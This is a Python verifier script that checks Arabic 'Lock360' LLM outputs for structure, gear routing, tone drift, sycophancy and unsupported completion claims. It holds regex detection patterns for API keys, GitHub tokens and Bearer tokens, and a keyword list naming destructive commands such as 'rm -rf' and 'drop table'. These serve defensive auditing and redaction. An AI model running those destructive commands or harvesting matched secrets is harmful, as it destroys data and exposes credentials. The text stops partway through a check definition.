#!/usr/bin/env python3
"""lock360.py - deterministic Lock360 engine (stdlib only, Python >= 3.8).

The LLM is the solver; this script is the verifier that "thinks differently":
it never reasons about the subject, it only checks structure, gear routing and
language drift of a Lock360 output. Works from the repo root or from an
installed skill folder (SKILL.md must sit one level above this file).

Commands
  route    [--text T | --file F | stdin] [--json]
           Deterministic gear / level / tone / lens router for a request.
  audit    --output F|- [--request F] [--gear P|S|M|L] [--tone human|engineering|mixed] [--json]
           Ant trap (ground-level structural gaps) + fly net (airborne drift).
  audit-skill <dir | SKILL.md | folder of skills> [--strict] [--json]
           Supply-chain audit of a skill folder before installing it (SA-* checks:
           frontmatter, BOM/bidi trojan, download-to-shell pipes, secrets, prompt
           injection, broken links, missing negative triggers, size, RTL tables).
           --strict turns WARN into exit 1. Exit 2 when no SKILL.md is found.
  skeleton [--gear X] [--tone X]
           Prints the stage skeleton a weak model must fill verbatim.
  catalog  [--md] [--out FILE]
           Prints the check catalog (RTL-safe markdown with --md).
  eval     [--cases FILE] [--json]
           Runs tests/eval_cases.json (red-green cases). Exit 1 on any failure.
  --selftest
           Built-in smoke tests that need no external files.

Exit codes: 0 PASS/WARN, 1 FAIL, 2 usage or missing input.
"""
import json
import os
import re
import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SKILL_FILE = os.path.join(ROOT, "SKILL.md")
VERSION_FILE = os.path.join(ROOT, "VERSION")
DEFAULT_CASES = os.path.join(ROOT, "tests", "eval_cases.json")


def read_version():
    try:
        with open(VERSION_FILE, "r", encoding="utf-8") as fh:
            return fh.read().strip()
    except OSError:
        pass
    # Installed skill folders carry SKILL.md but not VERSION: read the version from there.
    try:
        with open(SKILL_FILE, "r", encoding="utf-8") as fh:
            m = re.search(r"\bv\d+\.\d+\b", fh.read())
            if m:
                return m.group(0)
    except OSError:
        pass
    return "unknown"


# ------------------------------------------------------------------ text utils
TASHKEEL_RE = re.compile("[\u064B-\u0652\u0640]")


def norm(s):
    s = TASHKEEL_RE.sub("", s)
    for a, b in (("\u0623", "\u0627"), ("\u0625", "\u0627"), ("\u0622", "\u0627"),
                 ("\u0649", "\u064A"), ("\u0629", "\u0647")):
        s = s.replace(a, b)
    return s.lower()


def words(s):
    return re.findall(r"[\w\u0600-\u06FF]+", s)


def has(rx, s):
    return rx.search(s) is not None


def rx(pattern, flags=re.I):
    return re.compile(pattern, flags)


# ------------------------------------------------------------------ vocabulary
# Explicit L2/L3 triggers: MUST stay identical to the explicit list in SKILL.md
# (the eval `sync` case enforces it in both directions).
TRIGGERS_EXPLICIT = [
    "قفّل 360", "360 درجة", "1600 درجة", "10000 درجة", "بالضبة والمفتاح",
    "اقفل كل الثغرات", "مفيش أي ثغرة", "جميع التريكات", "أي تريكاية",
    "شامل كامل متكامل", "جميع الأنظمة", "جميع الأقسام", "جميع الفروع",
    "أقسام ومحاور وفروع", "شمال يمين فوق تحت شرق غرب", "منهج الحج والفدية",
    "من السور للداخل", "من بره ومن جوه", "غفوة الحارس وتبديل الشفتات",
    "قناع رامز", "حرامي المتحف", "اسألني ولا تخمّن", "zero gaps", "/lock360",
]
TRIGGERS_L3 = ["1600 درجة", "10000 درجة", "شامل كامل متكامل", "جميع الأنظمة"]
# Aliases widen matching without touching the canonical list above.
TRIGGER_ALIASES = {
    "1600°": "1600 درجة", "10000°": "10000 درجة", "360°": "360 درجة",
    "zero-gaps": "zero gaps", "lock360": "/lock360", "قفل 360": "قفّل 360",
    "بالضبه والمفتاح": "بالضبة والمفتاح", "تبديل الشفتات": "غفوة الحارس وتبديل الشفتات",
}
# Light L1 signals: MUST stay identical to the light list in SKILL.md.
TRIGGERS_LIGHT = [
    "MECE", "Edge Cases", "Race Conditions", "Zero-Trust", "Defense-in-Depth",
    "Red Team", "Blast Radius", "FMEA", "Pre-Mortem", "كل الجوانب",
]
LIGHT_ALIASES = {"zero trust": "Zero-Trust", "defense in depth": "Defense-in-Depth",
                 "red-team": "Red Team", "pre mortem": "Pre-Mortem", "premortem": "Pre-Mortem"}

ONE_WAY_DOOR = rx(
    r"حذف نهائي|احذف (?:كل|الداتا|البيانات)|drop\s+table|rm\s+-rf|برودكشن|الإنتاج|production|"
    r"deploy(?:ment)? to prod|ترحيل (?:الداتا|قاعدة)|migration|أستقيل|استقالة|أسيب شغلي|"
    r"جوازة|أتجوز|زواج|طلاق|هجرة|سفر دائم|قرض|رهن|أبيع (?:البيت|الشقة|العربية)|عملية جراحية|"
    r"كل مدخراتي|كل الفلوس|استثمار كبير|باب اتجاه واحد|لا رجعة|one-way door|irreversible")
GEAR_REQUEST = rx(r"(?:الترس|ترس|gear)\s*[:：]?\s*\[?\s*\**\s*`?\s*(P|S|M|L)\b")
GEAR_DECLARED = rx(r"(?:الترس|ترس|gear)[^\n]{0,25}?\b(P|S|M|L)\b")
PATCH_RE = rx(r"/patch-360")

LENS_KEYWORDS = {
    "software": rx(r"كود|code|api|سيرفر|server|script|سكربت|bug|باج|database|قاعدة بيانات|deploy|git|"
                   r"أتمتة|automation|سحابة|cloud|docker|pipeline|endpoint|schema|بايثون|python|توكن|token"),
    "life": rx(r"جوازة|زواج|أتجوز|اتجوز|خطوبة|سفر|هجرة|استقالة|أستقيل|شغل جديد|دراسة|ماجستير|علاقة|أنتقل"),
    "negotiation": rx(r"تفاوض|إقناع|أقنع|اتفاق|خلاف|تسعير|نقاش مع|أتكلم مع|مفاوضة"),
    "finance": rx(r"فلوس|مال|ميزانية|استثمار|شراكة|مشروع تجاري|ربح|تكلفة|قرض|تمويل|cashflow"),
    "faith": rx(r"حلال|حرام|فتوى|شرعي|ديني|صلاة|زكاة|صيام|الشيخ"),
    "health": rx(r"صحة|صحتي|دواء|رجيم|دايت|رياضة|جيم|علاج|أعراض|دكتور|طبيب"),
    "field": rx(r"شقة|عربية|سيارة|جهاز|لابتوب|صيانة|عفش|تركيب|سباك|كهربائي|مقاس"),
}
TONE_HUMAN = rx(r"أمي|أبويا|مراتي|جوزي|ابني|بنتي|أخويا|أختي|جوازة|زواج|أتجوز|اتجوز|خطوبة|العيلة|عيلتي|"
                r"الشيخ|صلاة|صيام|الحج|دكتور|علاج|رجيم|دايت|صحتي|نفسيتي|صاحبي|أصحابي|"
                r"الإجازة|أستقيل|شغلي|مديري|البيت|الأولاد|العيال")
TONE_ENG = rx(r"كود|code|api|سيرفر|server|deploy|script|سكربت|bug|باج|database|قاعدة بيانات|git|"
              r"commit|docker|pipeline|function|دالة|endpoint|schema|migration|توكن|token|لوج|log|"
              r"exception|unit test|python|javascript|sql|سحابة|cloud|cron|json|yaml")
TONE_CONTEXT = rx(r"السياق\s*[:：]\s*\[?([^\]\n]+)")
TONE_OVERRIDE = rx(r"أسلوب العرض[^:：\n]*[:：]\s*\[?\s*(بشري|هندسي|تلقائي|human|engineering|mixed)")
# Engineering jargon that must not leak into a human-tone output (3+ distinct = leak).
ENGINEERING_TERMS = [
    "blast radius", "kill switch", "rollback", "pre-mortem", "spof", "tripwire", "fmea",
    "idempoten", "race condition", "ground truth", "steelman", "mece", "no-regret",
    "dod", "checkpoint", "stakeholder", "backoff", "circuit breaker", "wip limit",
]

SYCOPHANCY_RE = rx(r"فكرة رائعة|فكرة ممتازة|سؤال ممتاز|سؤال رائع|ممتاز!|عظيم!|رائع!|great!|perfect!|excellent!|awesome")
RATIONALIZE_RE = rx(r"المفروض (?:ي|ت)شتغل|غالب[اً]* (?:شغال|هيشتغل|تمام)|تعديل بسيط|المرة دي بس|"
                    r"مفيش داعي (?:ن|ت)ختبر|مش محتاج اختبار|should work|probably works|probably fine|"
                    r"looks good|just this once|seems fine|should be fine")
FALSE_DONE_CLAIM = rx(r"تم التحقق|تم التأكد|اتأكدت|verified|شغال تمام|كله تمام|\bdone\b|جاهز للنشر|مكتمل ومختبر|اتعمل وشغال")
EVIDENCE_RE = rx(r"لوج|\blog\b|exit|sha|بصمة|\bpass\b|\bfail\b|rc=|شغّلت|شغلت|نفّذت|نفذت|ناتج الأمر|output|"
                 r"سطر\s+\d|صف في|قاعدة البيانات|اختبار\s+(?:مرّ|مر|نجح|فعلي|حي)|test\s+(?:pass|output)|بعد آخر تعديل")
ABSOLUTE_RE = rx(r"مضمون 100|صفر ثغرات نهائي|مستحيل (?:ي|ت)فشل|مفيش أي احتمال|guaranteed 100|zero risk|"
                 r"no way it fails|100% safe|آمن 100|بلا أي احتمال للخطأ|مؤكد 100%")
HEDGE_RE = rx(r"(?<!\w)(?:ربما|يبدو|غالبا|قد يكون|maybe|might|probably|perhaps)(?!\w)")
CLOSED_CLAIM_RE = rx(r"مكتمل تمام|اكتمال التغطية|تغطية كاملة|صفر ثغرات|لا توجد مجاهيل|بلا أي ثغرة|محسوم بالكامل|100%\s*مؤكد")
SENSITIVE = [
    ("medical", rx(r"دواء|جرعة|تشخيص|أعراض خطيرة"), rx(r"طبيب|دكتور|صيدلي|مختص|متخصص|استشاري|doctor")),
    ("faith", rx(r"فتوى|(?<!\w)(?:ال)?(?:حلال|حرام)(?!\w)"), rx(r"مفتي|الشيخ|شيخ|عالم|أهل العلم|مختص|متخصص")),
    ("legal-finance", rx(r"عقد قانوني|توكيل|دعوى|قرض بنكي|رهن عقاري|استثمار كل"), rx(r"محامي|مستشار قانوني|محاسب|مختص|متخصص|lawyer")),
]
SECRET_PATTERNS = [
    ("openai-style", re.compile(r"(?<![A-Za-z0-9])s" + r"k-[A-Za-z0-9]{10,}")),
    ("github-pat", re.compile(r"gh" + r"p_[A-Za-z0-9]{20,}")),
    ("bearer", re.compile(r"Bea" + r"rer\s+[A-Za-z0-9._-]{16,}")),
    ("bot-token", re.compile(r"\b\d{8,10}:[A-Za-z0-9_-]{35}\b")),
    ("api-key-assign", re.compile(r"api" + r"[_-]?key\s*[:=]\s*\S{8,}", re.I)),
]
PLACEHOLDER_RE = rx(r"\[\.\.\.\]|\[اكتب|\[ضع |\[اسم |\[\.\.\.\s*\]")
CONF_PCT_RE = rx(r"\d{1,3}\s*[%٪]")
CONF_WORD_PCT_RE = rx(r"(?:الثقة|ثقة|confidence)[^\n]{0,40}?\d{1,3}\s*[%٪]")
TAG_RE = rx(r"✅|⚠️|⚠|❓|\[مؤكد|\[مستنتج|\[مجهول")

# ------------------------------------------------------------------ stages / gears
STAGES = [
    ("3.1", "الزتونة التنفيذية (TL;DR)", "الترس وسببه + الحكم الصريح + أكبر خطر + أول خطوة. ممنوع نسبة الثقة هنا."),
    ("3.2", "شجرة التفكيك الحاصر ونطاق الأثر", "أقسام ⬅ محاور ⬅ فروع ⬅ حالات حدية، ⭐ لأهم 20%، وما الموجود حالياً الممنوع يتكسر."),
    ("3.3", "ميزان الأحكام (منهج الحج)", "ركن / واجب+فدية / سنة / مباح / مكروه / محظور+كفارة لكل عنصر جوهري."),
    ("3.4", "فيزياء الواقع والميكانيكا", "الوقت والمال والطاقة مقابل المتاح، المسار الحرج، الاحتكاك، القصور، الصيانة."),
    ("3.5", "العامل البشري", "مين يكسب ومين يخسر، الدوافع الخفية، التحيزات، التوقيت النفسي."),
    ("3.6", "نوع الباب والآثار × 3", "اتجاه واحد أم اتجاهين؟ وبعدين إيه بعد أسبوع وشهر وسنة؟ تكلفة الانتظار."),
    ("3.7", "حراسة القصر وتبديل الشفتات", "من بره ومن جوه (طبقتان على الأقل) + الشروط الكامنة + أضعف لحظة انتقال وقفلها."),
    ("3.8", "قناع رامز والدليل القاطع", "إيه اللي شكله سليم وخادع؟ ولكل ادعاء: الدليل الملموس وكيف أختبره بنفسي."),
    ("3.9", "عين حرامي المتحف", "أذكى مهاجم يدخل منين؟ الثغرات حسب الترس + مرّر المخرج على مصيدة النمل."),
    ("3.10", "سجل المخاطر FMEA", "كارت عمودي لكل خطر: الخطورة، الاحتمال، الاكتشاف، AP، القفل، الفدية، Tripwire."),
    ("3.11", "التراجع والتوقف والموت المسبق", "Tripwires + زر الطوارئ + مسار الرجوع + أرجح سبب فشل بعد 6 شهور."),
    ("3.12", "اسألني ولا تخمّن", "فقط الأسئلة التي تغيّر القرار، ولكل سؤال: ليه مهم وإيه اللي هيتغير."),
    ("3.13", "خطة التنفيذ", "S: 3 أقفال لا ندم عليها + خطوة 24 ساعة · M: المسار الحرج · L: GO/HOLD + DoD."),
    ("3.14", "لوحة الحسم والثقة", "✅ محسوم · ⚠️ مستنتج · ❓ مجهول · الثقة % مرة واحدة هنا فقط + شبكة الدبان."),
]
STAGE_IDS = [s[0] for s in STAGES]
GEAR_STAGES = {
    "P": [],
    "S": ["3.1", "3.2", "3.6", "3.11", "3.12", "3.13", "3.14"],
    "M": ["3.1", "3.2", "3.3", "3.4", "3.5", "3.6", "3.7", "3.9", "3.11", "3.12", "3.13", "3.14"],
    "L": list(STAGE_IDS),
}
WORD_CAP = {"S": 650}
P_GATES = [rx(r"المتبقي|الثغرات|leftover"), rx(r"التسليم|التزامن|handover"),
           rx(r"الدليل|evidence|ground truth"), rx(r"الاستيضاح|أسئلة|سؤال|clarif")]


# ------------------------------------------------------------------ router
def route(text):
    raw = text or ""
    n = norm(raw)
    reasons = []
    explicit = []
    for t in TRIGGERS_EXPLICIT:
        if norm(t) in n:
            explicit.append(t)
    for alias, canon in TRIGGER_ALIASES.items():
        if norm(alias) in n and canon not in explicit:
            explicit.append(canon)
    light = []
    for t in TRIGGERS_LIGHT:
        if norm(t) in n:
            light.append(t)
    for alias, canon in LIGHT_ALIASES.items():
        if norm(alias) in n and canon not in light:
            light.append(canon)
    one_way = sorted(set(m.group(0) for m in ONE_WAY_DOOR.finditer(raw)))
    m = GEAR_REQUEST.search(raw)
    requested = m.group(1).upper() if m else None
    mode, level, gear, escalated = "lock360", "none", None, False

    if PATCH_RE.search(raw):
        mode, level = "patch", "patch"
        reasons.append("/patch-360 is a self-upgrade command, not a gear")
    elif explicit:
        level = "L3" if any(t in TRIGGERS_L3 for t in explicit) else "L2"
        gear = requested or ("L" if level == "L3" else "M")
        reasons.append("explicit trigger -> %s" % level)
    elif requested:
        level = "L1" if requested == "P" else "L2"
        gear = requested
        reasons.append("gear requested explicitly: %s" % requested)
    elif light:
        level, gear = "L1", "P"
        reasons.append("light signal only -> L1 post-task guard (no forced L)")
    else:
        reasons.append("no trigger: Lock360 stays off (anti over-trigger)")

    if one_way and mode != "patch":
        if gear != "L":
            escalated = True
            reasons.append("one-way-door keyword -> forced gear L: %s" % ", ".join(one_way))
        gear = "L"
        if level in ("none", "L1"):
            level = "L2"
    if requested and gear and gear != requested and not escalated:
        reasons.append("requested %s kept" % requested)

    tone, tone_src = detect_tone(raw)
    lenses = [name for name, rxp in LENS_KEYWORDS.items() if rxp.search(raw)]
    return {
        "mode": mode, "level": level, "gear": gear, "requested_gear": requested,
        "escalated": escalated, "tone": tone, "tone_source": tone_src, "lenses": lenses,
        "explicit_triggers": explicit, "light_signals": light, "one_way_door": one_way,
        "required_stages": GEAR_STAGES.get(gear, []) if gear else [],
        "word_cap": WORD_CAP.get(gear), "reasons": reasons,
    }


def detect_tone(raw):
    m = TONE_OVERRIDE.search(raw)
    if m:
        v = m.group(1).lower()
        if v in ("بشري", "human"):
            return "human", "explicit"
        if v in ("هندسي", "engineering"):
            return "engineering", "explicit"
        if v == "mixed":
            return "mixed", "explicit"
    m = TONE_CONTEXT.search(raw)
    if m:
        ctx = norm(m.group(1))
        if re.search(r"شخصي|عائلي|ديني|صحي|اسري|نفسي", ctx):
            return "human", "context-field"
        if re.search(r"برمج|انظمه|تقني|كود|هندس", ctx):
            return "engineering", "context-field"
        if re.search(r"مالي|عمل|ميداني|تفاوض|تجاري", ctx):
            return "mixed", "context-field"
    h = len(TONE_HUMAN.findall(raw))
    e = len(TONE_ENG.findall(raw))
    if e and not h:
        return "engineering", "keywords"
    if h and not e:
        return "human", "keywords"
    if h and e:
        return "mixed", "keywords"
    return "mixed", "default"


# ------------------------------------------------------------------ output parser
HEAD_RE = re.compile(r"^\W*3\.(\d{1,2})(?!\d)")
HEAD_HASH_RE = re.compile(r"^#{1,6}.{0,40}?(?<![\d.])3\.(\d{1,2})(?!\d)")


class Doc(object):
    def __init__(self, text):
        self.text = text.replace("\r\n", "\n")
        self.stages = {}
        self.order = []
        self.preamble = []
        self.tables = []
        self.title = ""
        cur = None
        in_fence = False
        for i, line in enumerate(self.text.split("\n"), 1):
            s = line.strip()
            if s.startswith("```") or s.startswith("~~~"):
                in_fence = not in_fence
                continue
            if in_fence:
                if cur:
                    self.stages[cur].append(line)
                continue
            m = HEAD_RE.match(line) or HEAD_HASH_RE.match(line)
            if m and 1 <= int(m.group(1)) <= 14 and len(s) < 160:
                sid = "3.%d" % int(m.group(1))
                if sid not in self.stages:
                    self.stages[sid] = []
                    self.order.append(sid)
                cur = sid
                continue
            if s.startswith("|"):
                self.tables.append(i)
            if cur:
                self.stages[cur].append(line)
            else:
                if s.startswith("#") and not self.title:
                    self.title = s
                self.preamble.append(line)

    def body(self, sid):
        return "\n".join(self.stages.get(sid, []))

    def has(self, sid):
        return sid in self.stages

    def wc(self, sid=None):
        return len(words(self.body(sid) if sid else self.text))


# ------------------------------------------------------------------ check registry
CHECKS = []


class Skip(object):
    def __init__(self, reason):
        self.reason = reason


def check(cid, kind, severity, gears, title, detect, fix):
    def deco(fn):
        CHECKS.append({"id": cid, "kind": kind, "severity": severity, "gears": gears,
                       "title": title, "detect": detect, "fix": fix, "fn": fn})
        return fn
    return deco


def sev_for(chk, gear):
    s = chk["severity"]
    if isinstance(s, dict):
        return s.get(gear, s.get("*", "WARN"))
    return s


def applies(chk, gear):
    g = chk["gears"]
    return g == "*" or gear in g


# ---- ants (ground-level structural gaps)
@check("A-STAGE-MISSING", "ant", "FAIL", ("S", "M", "L"), "مرحلة مطلوبة غائبة",
       "عناوين 3.x المطلوبة للترس غير موجودة في المخرج.", "أضف المرحلة بعنوانها الرقمي ولو بسطرين صادقين؛ لا تحذف مرحلة من الترس.")
def c_stage_missing(ctx):
    doc, gear = ctx["doc"], ctx["gear"]
    missing = [s for s in GEAR_STAGES[gear] if not doc.has(s)]
    return ["missing stages for gear %s: %s" % (gear, ", ".join(missing))] if missing else []


@check("A-STAGE-EMPTY", "ant", "FAIL", ("S", "M", "L"), "مرحلة فارغة أو شكلية",
       "عنوان المرحلة موجود لكن جسمها أقل من 12 كلمة أو كله خانات فاضية.", "املأ المرحلة بمحتوى فعلي أو اكتب صراحة لماذا لا تنطبق.")
def c_stage_empty(ctx):
    doc = ctx["doc"]
    out = []
    for s in doc.order:
        body = PLACEHOLDER_RE.sub("", doc.body(s))
        if len(words(body)) < 12:
            out.append("%s has %d words" % (s, len(words(body))))
    return out


@check("A-PLACEHOLDER", "ant", "FAIL", "*", "خانة قالب متروكة",
       "بقايا [...] أو [اكتب أو [ضع خارج 3.12 وخارج كتل الكود.", "املأ الخانة أو حوّلها إلى سؤال في 3.12 أو احذفها.")
def c_placeholder(ctx):
    doc = ctx["doc"]
    out = []
    for s in doc.order:
        if s == "3.12":
            continue
        n = len(PLACEHOLDER_RE.findall(doc.body(s)))
        if n:
            out.append("%s keeps %d placeholder(s)" % (s, n))
    if PLACEHOLDER_RE.search("\n".join(doc.preamble)):
        out.append("preamble keeps placeholder(s)")
    return out


@check("A-TAG-MISSING", "ant", "WARN", "*", "أحكام بلا وسم صدق",
       "أقل من نصف أسطر 3.14 تحمل ✅ أو ⚠️ أو ❓.", "علّم كل حكم في 3.14 بوسم واحد من الثلاثة.")
def c_tag_missing(ctx):
    doc = ctx["doc"]
    if not doc.has("3.14"):
        return []
    lines = [l for l in doc.stages["3.14"] if l.strip()]
    if not lines:
        return []
    tagged = sum(1 for l in lines if TAG_RE.search(l))
    return ["3.14: %d/%d lines tagged" % (tagged, len(lines))] if tagged * 2 < len(lines) else []


@check("A-TABLE", "ant", "FAIL", "*", "جدول Markdown يكسر RTL",
       "سطر يبدأ بـ | خارج كتلة كود.", "حوّل الجدول إلى كروت رأسية أو قائمة نقطية.")
def c_table(ctx):
    t = ctx["doc"].tables
    return ["%d table row(s) at line(s) %s" % (len(t), ", ".join(str(x) for x in t[:5]))] if t else []


@check("A-CONF-DUP", "ant", "FAIL", "*", "نسبة ثقة خارج 3.14 أو مكررة",
       "كلمة الثقة مع % في أي مرحلة غير 3.14، أو نسبتان مختلفتان داخل 3.14.", "اذكر نسبة الثقة مرة واحدة فقط في 3.14.")
def c_conf_dup(ctx):
    doc = ctx["doc"]
    out = []
    for s in doc.order:
        if s != "3.14" and CONF_WORD_PCT_RE.search(doc.body(s)):
            out.append("confidence %% mentioned in %s" % s)
    if CONF_WORD_PCT_RE.search("\n".join(doc.preamble)):
        out.append("confidence % mentioned before 3.1")
    if doc.has("3.14"):
        pcts = set(re.sub(r"\s", "", p) for p in CONF_PCT_RE.findall(doc.body("3.14")))
        if len(pcts) > 1:
            out.append("3.14 shows %d different percentages" % len(pcts))
    return out


@check("A-CONF-MISSING", "ant", "FAIL", ("S", "M", "L"), "الثقة غائبة في 3.14",
       "3.14 موجودة بلا أي نسبة %.", "أضف سطر الثقة الإجمالية [..%] وما الذي يقلب الحكم.")
def c_conf_missing(ctx):
    doc = ctx["doc"]
    if doc.has("3.14") and not CONF_PCT_RE.search(doc.body("3.14")):
        return ["3.14 has no confidence percentage"]
    return []


@check("A-ORDER", "ant", "WARN", ("S", "M", "L"), "ترتيب المراحل مكسور",
       "أول عنوان ليس 3.1 أو المراحل لا تظهر بترتيب تصاعدي.", "ابدأ بـ 3.1 والتزم بالترتيب الرقمي.")
def c_order(ctx):
    doc = ctx["doc"]
    out = []
    if doc.order and doc.order[0] != "3.1" and doc.has("3.1"):
        out.append("first heading is %s, not 3.1" % doc.order[0])
    nums = [int(s.split(".")[1]) for s in doc.order]
    if nums != sorted(nums):
        out.append("stage order: %s" % " > ".join(doc.order))
    return out


@check("A-KILL-SWITCH", "ant", {"S": "WARN", "M": "FAIL", "L": "FAIL"}, ("S", "M", "L"), "لا زر طوارئ ولا مسار رجوع",
       "3.11 بلا Kill Switch/زر الطوارئ وبلا Rollback/مسار الرجوع.", "حدد الشرط القاطع للتوقف الفوري وكيف نرجع لنقطة الأمان.")
def c_kill(ctx):
    doc = ctx["doc"]
    if not doc.has("3.11"):
        return []
    b = doc.body("3.11")
    ks = has(rx(r"kill switch|زر الطوارئ|قاطع الإيقاف|نوقف فور|إمتى نوقف|امتى نوقف"), b)
    rb = has(rx(r"rollback|الرجوع|التراجع|نرجع|مسار الرجوع"), b)
    return [] if (ks or rb) else ["3.11 lacks both kill switch and rollback"]


@check("A-24H", "ant", "WARN", ("S",), "لا خطوة خلال 24 ساعة",
       "3.13 في الترس S بلا ذكر 24 ساعة أو أول خطوة.", "اختم 3.13 بأول خطوة ملموسة تبدأها خلال 24 ساعة.")
def c_24h(ctx):
    doc = ctx["doc"]
    if doc.has("3.13") and not has(rx(r"24\s*ساعة|24h|أول خطوة|اول خطوة|خلال يوم"), doc.body("3.13")):
        return ["3.13 has no 24-hour first step"]
    return []


@check("A-NOREGRET", "ant", "WARN", ("S", "M"), "لا أقفال لا ندم عليها",
       "3.13 بلا No-Regret / لا ندم.", "اذكر الخطوات الصالحة مهما كانت إجابات 3.12.")
def c_noregret(ctx):
    doc = ctx["doc"]
    if doc.has("3.13") and not has(rx(r"no-regret|no regret|لا ندم|مش هتندم|مهما كانت"), doc.body("3.13")):
        return ["3.13 has no no-regret locks"]
    return []


@check("A-BLAST", "ant", "WARN", ("M", "L"), "نطاق الأثر غائب",
       "3.2 بلا Blast Radius / الموجود حالياً الممنوع يتكسر.", "اذكر ما يعمل الآن وقد يتأثر، وكيف نعزله.")
def c_blast(ctx):
    doc = ctx["doc"]
    if doc.has("3.2") and not has(rx(r"blast radius|نطاق الأثر|الموجود حالي|شغال دلوقتي|ممنوع يتكسر|ممكن يتأثر|الموجود حالياً"), doc.body("3.2")):
        return ["3.2 has no blast radius"]
    return []


@check("A-DEPTH-1", "ant", "WARN", ("M", "L"), "طبقة دفاع واحدة فقط",
       "3.7 لا يذكر الجدار الثاني / العزل الداخلي (من جوه).", "أضف ماذا يمنع امتداد الضرر لو انهار السور الأول.")
def c_depth(ctx):
    doc = ctx["doc"]
    if doc.has("3.7") and not has(rx(r"من جوه|الجدار التاني|الجدار الثاني|العزل الداخلي|طبقة ثانية|containment|لو انهار|لو فشلت الخطوة الأولى"), doc.body("3.7")):
        return ["3.7 mentions a single defense layer"]
    return []


@check("A-LATENT", "ant", "WARN", ("M", "L"), "الشروط الكامنة غير مسجلة",
       "3.7 بلا سجل الشروط الكامنة (الثقوب الموجودة قبل البدء: ضغط وقت، تعب، أدوات ناقصة).", "اكتب سطر: الشروط الكامنة الآن هي ... وكيف نعوّضها.")
def c_latent(ctx):
    doc = ctx["doc"]
    if doc.has("3.7") and not has(rx(r"الشروط الكامنة|شروط كامنة|latent|كامن|ثقوب موجودة"), doc.body("3.7")):
        return ["3.7 has no latent-conditions line"]
    return []


@check("A-FMEA-CARD", "ant", "FAIL", ("L",), "بطاقة FMEA ناقصة",
       "3.10 بلا بطاقات 🔻 أو بطاقة بلا القفل الاستباقي أو بلا الفدية/التعويض.", "لكل خطر: القفل الاستباقي + خطة التعويض + Tripwire.")
def c_fmea(ctx):
    doc = ctx["doc"]
    if not doc.has("3.10"):
        return []
    b = doc.body("3.10")
    cards = [c for c in re.split(r"(?m)🔻|^\s*[-*]?\s*\**الخطر\s*[:：]", b)[1:] if c.strip()]
    if not cards:
        return ["3.10 has no risk cards"]
    out = []
    for i, c in enumerate(cards, 1):
        if not has(rx(r"القفل|الاستباقي|prevent|منع"), c) or not has(rx(r"التعويض|الفدية|fallback|recovery"), c):
            out.append("card %d lacks lock or fallback" % i)
    return out


@check("A-FMEA-AP", "ant", "WARN", ("L",), "أولوية الفعل AP غائبة",
       "بطاقات 3.10 بلا AP [H/M/L] أو الأولوية.", "أضف سطر الأولوية (AP): H / M / L لكل بطاقة.")
def c_fmea_ap(ctx):
    doc = ctx["doc"]
    if doc.has("3.10") and "🔻" in doc.body("3.10") and not has(rx(r"\bAP\b|الأولوية"), doc.body("3.10")):
        return ["3.10 cards have no action priority (AP)"]
    return []


@check("A-QUESTION-FORMAT", "ant", "WARN", ("S", "M", "L"), "سؤال بلا سبب",
       "سؤال في 3.12 بدون سطر ليه مهم / إيه اللي هيتغير.", "لكل سؤال سطران: السؤال؟ ← ليه مهم وإيه اللي هيتغير حسب الإجابة.")
def c_qfmt(ctx):
    doc = ctx["doc"]
    if not doc.has("3.12"):
        return []
    lines = [l.strip() for l in doc.stages["3.12"] if l.strip()]
    bad = 0
    why = rx(r"←|⬅|ليه|لأن|هيتغير|يتغير|مهم")
    for i, l in enumerate(lines):
        if l.endswith("؟") or l.endswith("?") or "؟" in l:
            nxt = lines[i + 1] if i + 1 < len(lines) else ""
            if not (why.search(l) or why.search(nxt)):
                bad += 1
    return ["%d question(s) without a why-line" % bad] if bad else []


@check("A-SECRET", "ant", "FAIL", "*", "سر أو توكن داخل المخرج",
       "أنماط مفاتيح API أو توكنات أو رؤوس تفويض داخل النص.", "استبدل القيمة بـ [REDACTED] فوراً.")
def c_secret(ctx):
    out = []
    for name, p in SECRET_PATTERNS:
        if p.search(ctx["doc"].text):
            out.append("secret-like pattern: %s" % name)
    return out


@check("A-DOOR-UNSET", "ant", "WARN", ("S", "M", "L"), "نوع الباب غير محسوم",
       "3.6 لا يقول اتجاه واحد أم اتجاهين.", "احسم: باب اتجاه واحد (تأنَّ) أم اتجاهين (جرّب بسرعة).")
def c_door(ctx):
    doc = ctx["doc"]
    if doc.has("3.6") and not has(rx(r"اتجاه واحد|اتجاهين|one-way|two-way"), doc.body("3.6")):
        return ["3.6 does not classify the door"]
    return []


@check("A-UNKNOWN-CLOSED", "ant", "FAIL", "*", "ادعاء اكتمال مع مجهول قائم",
       "3.14 فيها ❓ مجهول غير فارغ وفي نفس الوقت ادعاء اكتمال أو صفر ثغرات.", "إما تسأل في 3.12 أو تخفّض الادعاء؛ لا تجمع بينهما.")
def c_unknown_closed(ctx):
    doc = ctx["doc"]
    if not doc.has("3.14"):
        return []
    b = doc.body("3.14")
    open_unknown = False
    for l in doc.stages["3.14"]:
        if "❓" in l or "[مجهول" in l:
            tail = re.split(r"[:：]", l, maxsplit=1)
            content = tail[1].strip() if len(tail) > 1 else ""
            if content and not rx(r"^(لا شيء|لا يوجد|لا توجد|—|-|\[\.\.\.\]|none)\.?\s*$").match(content):
                open_unknown = True
    claim = CLOSED_CLAIM_RE.search(b) or (doc.has("3.1") and CLOSED_CLAIM_RE.search(doc.body("3.1")))
    return ["open ❓ unknown together with a completeness claim"] if (open_unknown and claim) else []


@check("A-WORDCAP", "ant", "WARN", ("S",), "الترس S تجاوز سقفه",
       "مخرج S أطول من ~650 كلمة.", "ركّز على الـ ⭐ فقط أو ارفع الترس إلى M صراحة.")
def c_wordcap(ctx):
    n = ctx["doc"].wc()
    return ["%d words > cap %d" % (n, WORD_CAP["S"])] if n > WORD_CAP["S"] else []


@check("A-TONE-LEAK", "ant", "WARN", "*", "مصطلحات هندسية في لهجة بشرية",
       "في مخرج بشري/عائلي ظهور 3 مصطلحات هندسية مختلفة أو أكثر.", "استبدلها بمقابلها من TONE_GLOSSARY.md.")
def c_tone_leak(ctx):
    if ctx["tone"] != "human":
        return []
    low = ctx["doc"].text.lower()
    found = [t for t in ENGINEERING_TERMS if t in low]
    return ["engineering terms in human tone: %s" % ", ".join(found)] if len(found) >= 3 else []


@check("A-PGATE", "ant", "FAIL", ("P",), "بوابات الترس P ناقصة",
